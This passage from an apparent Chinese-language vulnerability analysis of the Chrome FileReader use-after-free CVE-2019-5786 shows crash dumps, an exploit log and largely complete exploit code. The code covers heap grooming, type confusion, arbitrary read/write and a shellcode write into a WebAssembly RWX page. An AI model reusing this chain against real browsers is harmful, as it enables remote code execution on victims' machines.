class="line">&#125;</span><br></pre></td></tr></table></figure><p>poc思路已经再poc注释中描述的很清晰了，核心思路就是通过onProgress和onLoadEnd得到两个可以指向相同结构体的指针，然后通过postMessage释放其中的一个指针，之后再使用了第二个指针触发漏洞。</p><p>运行查看可用性，发现成功触发crash</p><p><img src="/2021/05/31/CVE-2019-5786/image-20210527092652671.png" alt="image-20210527092652671"></p><p>附加windbg，可以查看到相关内存现场</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; g</span><br><span class="line">(8b4.1ea4): Access violation - code c0000005 (!!! second chance !!!)</span><br><span class="line">eax=00000004 ebx=008fe6a8 ecx=00000042 edx=00000042 esi=00000042 edi=13e04000</span><br><span class="line">eip=106dbd06 esp=0053eb2c ebp=0053eb54 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210202</span><br><span class="line">chrome_child!Builtins_DataViewPrototypeSetUint32+0x386:</span><br><span class="line">106dbd06 881407          mov     byte ptr [edi+eax],dl      ds:002b:13e04004=??</span><br><span class="line">0:000&gt; dd edi L1</span><br><span class="line">13e04000  ????????</span><br></pre></td></tr></table></figure><p>此时edi指向的内存已经被释放了，当使用另一块指向同样内存的指针时将会触发访问错误。</p><h4 id="（4）exp分析"><a href="#（4）exp分析" class="headerlink" title="（4）exp分析"></a>（4）exp分析</h4><p>exp打印日志如下，详细代码见[13]</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">hello, world!</span><br><span class="line">exploit.js:332 Array buffer allocation failed</span><br><span class="line">exploit.js:341 attempt 0 started</span><br><span class="line">exploit.js:289 onloadend attempt 1 after 76 onprogress callbacks</span><br><span class="line">exploit.js:54 found possible candidate objectat idx 4190250</span><br><span class="line">exploit.js:188 leaked absolute address of our object 5e0009c</span><br><span class="line">exploit.js:189 leaked absolute address of ta 4e04000</span><br><span class="line">exploit.js:70 found object idx in the spray array: 201 816</span><br><span class="line">exploit.js:199 addrof(reader_obj) == 98566301</span><br><span class="line">exploit.js:110 found corruptable Uint32Array-&gt;elements at 4ec1118, on Uint32Array idx 17 837</span><br><span class="line">exploit.js:246 success</span><br></pre></td></tr></table></figure><p>exp分析步骤参考[11]，[15]</p><h5 id="（1）分配128Mib字符串"><a href="#（1）分配128Mib字符串" class="headerlink" title="（1）分配128Mib字符串"></a>（1）分配128Mib字符串</h5><p>分配一个较大的字符串（128MiB），它将用作传递给<em>FileReader</em>的<em>Blob</em>的源。该分配将最终在自下而上的分配之后在自由区域中进行（从上面列出的地址空间中的<em>36690000开始</em>）。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> string_size = <span class="number">128</span> * <span class="number">1024</span> * <span class="number">1024</span>;</span><br><span class="line"><span class="keyword">let</span> contents = <span class="built_in">String</span>.prototype.repeat.call(<span class="string">&#x27;Z&#x27;</span>, string_size);</span><br><span class="line"><span class="keyword">let</span> f = <span class="keyword">new</span> File([contents], <span class="string">&quot;text.txt&quot;</span>);</span><br></pre></td></tr></table></figure><h5 id="（2）-堆布局"><a href="#（2）-堆布局" class="headerlink" title="（2） 堆布局"></a>（2） 堆布局</h5><p>在32位win7系统中通过申请1GB的ArrayBuffer，Chrome会尝试释放512MB保留内存，而分配失败的OOM异常可以被脚本捕获使得render进程不会crash，最终导致前面申请的128MB的ArrayBuffer在这块512MB内存上分配，不受隔离堆保护，释放后可以被其他js对象占位。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> failure = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">1024</span> * <span class="number">1024</span> * <span class="number">1024</span>);      </span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(e.message);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="（3）获取触发UAF的两个指针"><a href="#（3）获取触发UAF的两个指针" class="headerlink" title="（3）获取触发UAF的两个指针"></a>（3）获取触发UAF的两个指针</h5><p>调用<em>FileReader.readAsArrayBuffer</em>。将触发多个<em>onprogress</em>事件，如果事件的时间安排正确，则最后两个事件可以返回对同一基础ArrayBuffer的引用。可以无限重复此步骤，直到成功为止，而不会导致过程崩溃。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">reader.onprogress = <span class="function"><span class="keyword">function</span>(<span class="params">evt</span>) </span>&#123;</span><br><span class="line">    force_gc();</span><br><span class="line">    <span class="keyword">let</span> res = evt.target.result;</span><br><span class="line">    <span class="comment">// console.log(`onprogress $&#123;onprogress_cnt&#125;`);</span></span><br><span class="line">    onprogress_cnt += <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (res.byteLength != f.size) &#123;</span><br><span class="line">        <span class="comment">// console.log(`result has a different size than expected: $&#123;res.byteLength&#125;`);</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    lastlast = last;   </span><br><span class="line">    last = res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">    reader.onloadend = <span class="function"><span class="keyword">function</span>(<span class="params">evt</span>) </span>&#123;</span><br><span class="line">        try_cnt += <span class="number">1</span>;</span><br><span class="line">        failure = <span class="literal">false</span>; </span><br><span class="line">        <span class="keyword">if</span> (onprogress_cnt &lt; <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">`less than 2 onprogress events triggered: <span class="subst">$&#123;onprogress_cnt&#125;</span>, try again`</span>);</span><br><span class="line">            failure = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (lastlast.byteLength != f.size) &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">`lastlast has a different size than expected: <span class="subst">$&#123;lastlast.byteLength&#125;</span>`</span>);</span><br><span class="line">            failure = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (failure === <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&#x27;retrying in 1 second&#x27;</span>);</span><br><span class="line">            <span class="built_in">window</span>.setTimeout(exploit, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`onloadend attempt <span class="subst">$&#123;try_cnt&#125;</span> after <span class="subst">$&#123;onprogress_cnt&#125;</span> onprogress callbacks`</span>);</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="（4）触发漏洞"><a href="#（4）触发漏洞" class="headerlink" title="（4）触发漏洞"></a>（4）触发漏洞</h5><p>直接调用postmessage可以触发漏洞，之后通过捕获到UAF的异常进入catch逻辑，执行get_rw()与rce()</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">reader.onloadend = <span class="function"><span class="keyword">function</span>(<span class="params">evt</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// postMessage触发catch，执行漏洞逻辑</span></span><br><span class="line">            myWorker.postMessage([last], [last, lastlast]);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">            <span class="keyword">if</span> (e.message.includes(<span class="string">&#x27;ArrayBuffer at index 1 could not be transferred&#x27;</span>)) &#123;</span><br><span class="line">                get_rw();</span><br><span class="line">                rce();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(e.message);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h5 id="（5）类型混淆准备，相对地址读写"><a href="#（5）类型混淆准备，相对地址读写" class="headerlink" title="（5）类型混淆准备，相对地址读写"></a>（5）类型混淆准备，相对地址读写</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//向spray[outers][inners]写入特定内容</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reclaim_mixed</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> tmp = &#123;&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; outers; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j + <span class="number">2</span> &lt; inners; j+=<span class="number">3</span>) &#123;</span><br><span class="line">            spray[i][j] = &#123;<span class="attr">a</span>: marker1, <span class="attr">b</span>: marker2, <span class="attr">c</span>: tmp&#125;;</span><br><span class="line">            spray[i][j].c = spray[i][j]     <span class="comment">// 自己指向自己来得到绝对地址</span></span><br><span class="line">            spray[i][j+<span class="number">1</span>] = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">8</span>);</span><br><span class="line">            spray[i][j+<span class="number">2</span>] = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="number">32</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实就是对spray数组循环存取下面的内存布局</p><blockquote><p>{</p><p>​    {</p><p>​        {a: marker1, b: marker2, c:  spray[i][j]};</p><p>​    }    </p><p>​    Array(8);</p><p>​    Uint32Array(32);</p><p>}</p></blockquote><p>之后可以通过tarray搜索到marker1的flag内存区域，然后根据偏移找到对象地址以及tarray的首地址</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">tarray = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(lastlast);             <span class="comment">//倒数第二个onprogress返回值。</span></span><br><span class="line"><span class="comment">// find_pattern的过程</span></span><br><span class="line">object_prop_taidx = find_pattern();             <span class="comment">//通过marker1寻找偏移</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="comment">// 泄漏对象的绝对地址</span></span><br><span class="line"><span class="keyword">const</span> obj_absolute_addr = tarray[object_prop_taidx + <span class="number">2</span>] - <span class="number">1</span>;  <span class="comment">//通过 spray[i][j].c 泄露对象的地址</span></span><br><span class="line">ta_absolute_addr = obj_absolute_addr - (object_prop_taidx-<span class="number">3</span>)*<span class="number">4</span>   </span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`leaked absolute address of our object <span class="subst">$&#123;obj_absolute_addr.toString(<span class="number">16</span>)&#125;</span>`</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`leaked absolute address of ta <span class="subst">$&#123;ta_absolute_addr.toString(<span class="number">16</span>)&#125;</span>`</span>);</span><br><span class="line">reader_obj = get_obj_idx(object_prop_taidx);                        <span class="comment">//通过tarray的索引找到spray的索引</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="comment">// 现在reader_obj是对Object的引用，object_prop_taidx是从ta开头的第一个内联属性的索引</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`addrof(reader_obj) == <span class="subst">$&#123;addrof(reader_obj)&#125;</span>`</span>);             <span class="comment">//这个addrof(reader_obj)-1 == obj_absolute_addr</span></span><br><span class="line">aarw_ui32 = get_corruptable_ui32a();                <span class="comment">//这个函数返回了很多东西</span></span><br></pre></td></tr></table></figure><p>spray[i][j]的内存现场如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0:016&gt; dd 9770B8C</span><br><span class="line">09770b8c  047008bd 03a0066d 03a0066d 6c626466</span><br><span class="line">09770b9c  6e828a8c 09770b8d 03a00435 00000010</span><br></pre></td></tr></table></figure><p>之后得到了相对地址读写的功能</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ta_read</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 通过原始的释放区域读取绝对地址</span></span><br><span class="line">    <span class="comment">// 最大长度为ta_absolute_addr + string_size（128MiB）</span></span><br><span class="line">    <span class="keyword">if</span> (addr &gt; ta_absolute_addr &amp;&amp; addr &lt; ta_absolute_addr + string_size) &#123;</span><br><span class="line">        <span class="keyword">return</span> tarray[(addr-ta_absolute_addr)/<span class="number">4</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ta_write</span>(<span class="params">addr, value</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 通过原始的释放区域写入绝对地址</span></span><br><span class="line">    <span class="comment">// 最大长度为ta_absolute_addr + string_size（128MiB）</span></span><br><span class="line">    <span class="keyword">if</span> (addr % <span class="number">4</span> || value &gt; <span class="number">2</span>**<span class="number">32</span> - <span class="number">1</span> ||</span><br><span class="line">        addr &lt; ta_absolute_addr ||</span><br><span class="line">        addr &gt; ta_absolute_addr + string_size) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`invalid args passed to ta_write(<span class="subst">$&#123;addr.toString(<span class="number">16</span>)&#125;</span>, <span class="subst">$&#123;value&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    tarray[(addr-ta_absolute_addr)/<span class="number">4</span>] = value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来就可以通过类型混淆得到addressof的功能了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addrof</span>(<span class="params">leaked_obj</span>) </span>&#123;</span><br><span class="line">    reader_obj.a = leaked_obj;</span><br><span class="line">    <span class="keyword">return</span> tarray[object_prop_taidx];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="（6）任意地址读写"><a href="#（6）任意地址读写" class="headerlink" title="（6）任意地址读写"></a>（6）任意地址读写</h5><p>利用相对地址读写可以读写被腐烂缓冲区的backing_store，从而达到任意地址读写的目的</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_corruptable_ui32a</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 找到一个喷射的Uint32Array，其元素指针也落入受控区域</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; outers; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j + <span class="number">2</span> &lt; inners; j+=<span class="number">3</span>) &#123;</span><br><span class="line">            <span class="keyword">let</span> ui32a_addr = addrof(spray[i][j+<span class="number">2</span>]) - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">let</span> bs_addr = ta_read(ui32a_addr + <span class="number">12</span>) - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">let</span> elements_addr = ta_read(ui32a_addr + <span class="number">8</span>) - <span class="number">1</span>;</span><br><span class="line">            <span class="comment">// 读取其元素指针</span></span><br><span class="line">            <span class="comment">// 如果元素指针位于我们可以访问的区域内</span></span><br><span class="line">            <span class="keyword">if</span> (bs_addr &gt;= ta_absolute_addr &amp;&amp; bs_addr &lt; ta_absolute_addr + string_size &amp;&amp; </span><br><span class="line">                elements_addr &gt;= ta_absolute_addr &amp;&amp; elements_addr &lt; ta_absolute_addr + string_size) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">`found corruptable Uint32Array-&gt;elements at <span class="subst">$&#123;bs_addr.toString(<span class="number">16</span>)&#125;</span>, on Uint32Array idx <span class="subst">$&#123;i&#125;</span> <span class="subst">$&#123;j&#125;</span>`</span>);</span><br><span class="line">                <span class="keyword">return</span> &#123;</span><br><span class="line">                    <span class="attr">bs_addr</span>: bs_addr,</span><br><span class="line">                    <span class="attr">elements_addr</span>: elements_addr,</span><br><span class="line">                    <span class="attr">ui32</span>: spray[i][j+<span class="number">2</span>],</span><br><span class="line">                    <span class="attr">i</span>: i, <span class="attr">j</span>: j</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read4</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// save the old values</span></span><br><span class="line">    <span class="keyword">let</span> tmp1 = ta_read(aarw_ui32.elements_addr + <span class="number">12</span>);</span><br><span class="line">    <span class="keyword">let</span> tmp2 = ta_read(aarw_ui32.bs_addr + <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// rewrite the backing store ptr</span></span><br><span class="line">    ta_write(aarw_ui32.elements_addr + <span class="number">12</span>, addr); </span><br><span class="line">    ta_write(aarw_ui32.bs_addr + <span class="number">16</span>, addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> val = aarw_ui32.ui32[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    ta_write(aarw_ui32.elements_addr + <span class="number">12</span>, tmp1); </span><br><span class="line">    ta_write(aarw_ui32.bs_addr + <span class="number">16</span>, tmp2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write4</span>(<span class="params">addr, val</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// save the old values</span></span><br><span class="line">    <span class="keyword">let</span> tmp1 = ta_read(aarw_ui32.elements_addr + <span class="number">12</span>);</span><br><span class="line">    <span class="keyword">let</span> tmp2 = ta_read(aarw_ui32.bs_addr + <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// rewrite the backing store ptr</span></span><br><span class="line">    ta_write(aarw_ui32.elements_addr + <span class="number">12</span>, addr); </span><br><span class="line">    ta_write(aarw_ui32.bs_addr + <span class="number">16</span>, addr);</span><br><span class="line"></span><br><span class="line">    aarw_ui32.ui32[<span class="number">0</span>] = val;</span><br><span class="line"></span><br><span class="line">    ta_write(aarw_ui32.elements_addr + <span class="number">12</span>, tmp1); </span><br><span class="line">    ta_write(aarw_ui32.bs_addr + <span class="number">16</span>, tmp2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="（7）利用WebAssembly技术申请RWX空间，替换shellcode并执行"><a href="#（7）利用WebAssembly技术申请RWX空间，替换shellcode并执行" class="headerlink" title="（7）利用WebAssembly技术申请RWX空间，替换shellcode并执行"></a>（7）利用WebAssembly技术申请RWX空间，替换shellcode并执行</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wfunc = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">let</span> meterpreter = <span class="built_in">unescape</span>(<span class="string">&quot;%ue8fc%u0082%u0000%u8960%u31e5%u64c0%u508b%u8b30%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf2e2%u5752%u528b%u8b10%u3c4a%u4c8b%u7811%u48e3%ud101%u8b51%u2059%ud301%u498b%ue318%u493a%u348b%u018b%u31d6%uacff%ucfc1%u010d%u38c7%u75e0%u03f6%uf87d%u7d3b%u7524%u58e4%u588b%u0124%u66d3%u0c8b%u8b4b%u1c58%ud301%u048b%u018b%u89d0%u2444%u5b24%u615b%u5a59%uff51%u5fe0%u5a5f%u128b%u8deb%u6a5d%u8d01%ub285%u0000%u5000%u3168%u6f8b%uff87%ubbd5%ub5f0%u56a2%ua668%ubd95%uff9d%u3cd5%u7c06%u800a%ue0fb%u0575%u47bb%u7213%u6a6f%u5300%ud5ff%u6163%u636c%u652e%u6578%u4100&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rce</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_wasm_func</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> importObject = &#123;</span><br><span class="line">            <span class="attr">imports</span>: &#123; <span class="attr">imported_func</span>: <span class="function"><span class="params">arg</span> =&gt;</span> <span class="built_in">console</span>.log(arg) &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        bc = [<span class="number">0x0</span>, <span class="number">0x61</span>, <span class="number">0x73</span>, <span class="number">0x6d</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x8</span>, <span class="number">0x2</span>, <span class="number">0x60</span>, <span class="number">0x1</span>, <span class="number">0x7f</span>, <span class="number">0x0</span>, <span class="number">0x60</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x19</span>, <span class="number">0x1</span>, <span class="number">0x7</span>, <span class="number">0x69</span>, <span class="number">0x6d</span>, <span class="number">0x70</span>, <span class="number">0x6f</span>, <span class="number">0x72</span>, <span class="number">0x74</span>, <span class="number">0x73</span>, <span class="number">0xd</span>, <span class="number">0x69</span>, <span class="number">0x6d</span>, <span class="number">0x70</span>, <span class="number">0x6f</span>, <span class="number">0x72</span>, <span class="number">0x74</span>, <span class="number">0x65</span>, <span class="number">0x64</span>, <span class="number">0x5f</span>, <span class="number">0x66</span>, <span class="number">0x75</span>, <span class="number">0x6e</span>, <span class="number">0x63</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x3</span>, <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x7</span>, <span class="number">0x11</span>, <span class="number">0x1</span>, <span class="number">0xd</span>, <span class="number">0x65</span>, <span class="number">0x78</span>, <span class="number">0x70</span>, <span class="number">0x6f</span>, <span class="number">0x72</span>, <span class="number">0x74</span>, <span class="number">0x65</span>, <span class="number">0x64</span>, <span class="number">0x5f</span>, <span class="number">0x66</span>, <span class="number">0x75</span>, <span class="number">0x6e</span>, <span class="number">0x63</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0xa</span>, <span class="number">0x8</span>, <span class="number">0x1</span>, <span class="number">0x6</span>, <span class="number">0x0</span>, <span class="number">0x41</span>, <span class="number">0x2a</span>, <span class="number">0x10</span>, <span class="number">0x0</span>, <span class="number">0xb</span>];</span><br><span class="line">        wasm_code = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(bc);</span><br><span class="line">        wasm_mod = <span class="keyword">new</span> WebAssembly.Instance(<span class="keyword">new</span> WebAssembly.Module(wasm_code), importObject);</span><br><span class="line">        <span class="keyword">return</span> wasm_mod.exports.exported_func;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> wasm_func = get_wasm_func();</span><br><span class="line">    wfunc = wasm_func;</span><br><span class="line">    <span class="comment">// traverse the JSFunction object chain to find the RWX WebAssembly code page</span></span><br><span class="line">    <span class="keyword">let</span> wasm_func_addr = addrof(wasm_func) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> sfi = read4(wasm_func_addr + <span class="number">12</span>) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> WasmExportedFunctionData = read4(sfi + <span class="number">4</span>) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> instance = read4(WasmExportedFunctionData + <span class="number">8</span>) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> rwx_addr = read4(instance + <span class="number">0x74</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向RWX内存页中写入shellcode</span></span><br><span class="line">    <span class="keyword">if</span> (meterpreter.length % <span class="number">2</span> != <span class="number">0</span>)</span><br><span class="line">        meterpreter += <span class="string">&quot;\\u9090&quot;</span>;  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; meterpreter.length; i += <span class="number">2</span>) &#123;</span><br><span class="line">        write4(rwx_addr + i*<span class="number">2</span>, meterpreter.charCodeAt(i) + meterpreter.charCodeAt(i + <span class="number">1</span>) * <span class="number">0x10000</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 到了这步证明攻击已经成功了</span></span><br><span class="line">    <span class="built_in">window</span>.top.postMessage(<span 